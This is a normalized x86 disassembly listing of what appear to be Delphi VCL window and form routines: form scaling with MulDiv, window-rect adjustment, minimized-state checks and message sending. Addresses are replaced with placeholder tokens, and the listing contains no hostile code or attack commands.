call sub_44ed08
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d91
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_461d91
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_461dc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_461970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461dd0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_461dd0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4619f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_461e44
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_449868
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4299ac
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_449824
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4299ac
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416f4c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44c788
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_461eb4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461f15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4032e0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44fa98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f1c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_461f44
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4620a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_462088
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40309c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4034a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46208f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_462050
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4181e4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030a4
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
sub_4620d0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403350
and [ ebx + 0x2f4 ] 0xdf
sub_462108
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_461714
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_449590
xor edx edx
mov eax ebx
call sub_4495b4
mov edx 0x140
mov eax ebx
call sub_4495dc
mov edx 0xf0
mov eax ebx
call sub_449600
mov dl 0x1
mov eax [ r-xdata ]
call sub_428f40
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_462a24
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_4489fc
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40309c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_462d88
xor edx edx
mov eax ebx
call sub_449fe4
xor edx edx
mov eax ebx
call sub_449f4c
mov dl 0x1
mov eax ebx
call sub_45085c
mov edx ebx
mov eax [ rw-data ]
call sub_4673ec
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_462281
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_42126c
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41874c
xor edx edx
mov eax ebx
call sub_41baac
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_466294
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_4622ec
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403508
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_4623b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464c10
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_467424
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403154
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403154
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d130
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_46178c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623bd
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4623d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_462411
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_462d88
sub_462416
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403350
test al al
jne r-xdata
call sub_403984
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_462d88
sub_46244c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46248d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4624ac
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44bedc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403350
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_464754
sub_4624e8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4492f0
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418454
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_463b4c
mov edx esi
mov eax ebp
call sub_41874c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_463b24
mov edx esi
mov eax edi
call sub_463b4c
jmp r-xdata
xor edx edx
mov eax edi
call sub_463b00
sub_4625f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor edx edx
push ebp
push sub_46284a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c710
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44983c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_449880
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_46297c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44afd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462851
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_461c54
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4501e0
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_461c54
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4501e0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_424208
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_424210
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_462859
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44da5c
push 0x0
push 0x0
push ebx
push sub_462960
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_46292c
push ebx
push sub_462944
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_46290b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c1a4
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_449f4c
sub_462997
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_461c54
mov ecx edi
mov edx esi
mov eax ebx
call sub_4501e0
mov eax ebx
call sub_462a80
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_4242ac
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4242c8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_449868
mov ebp eax
push edi
push esi
mov eax ebx
call sub_449824
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_462d28
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_462d58
sub_462a24
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45071c
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_464d84
push eax
push 0x1
push 0x80
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_462ab8
push ebx
mov ebx eax
mov eax ebx
call sub_4639d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_462b4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45071c
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4507e4
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_45071c
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_462bd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_450c7c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4215f0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4215c4
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403350
test al al
jne r-xdata
sub_462c40
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40309c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_462c6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebp
call sub_44d44c
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4215f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_450cc4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4215c4
mov si 0xfff1
call sub_403350
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_421600
jmp r-xdata
sub_462d00
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44a008
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44afd4
sub_462d28
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44983c
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_462d58
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_449880
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_462d88
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_449d40
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_463ec0
pop esi
pop ebx
retn
sub_462dcc
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_462e25
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462e2c
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_462e34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_449cf4
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44dc74
mov eax ebx
call sub_44de10
sub_462e6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42143c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_462eac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e130
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403350
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403350
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44afd4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45cfb4
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4637d8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_463125
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_463108
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_425038
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424ed8
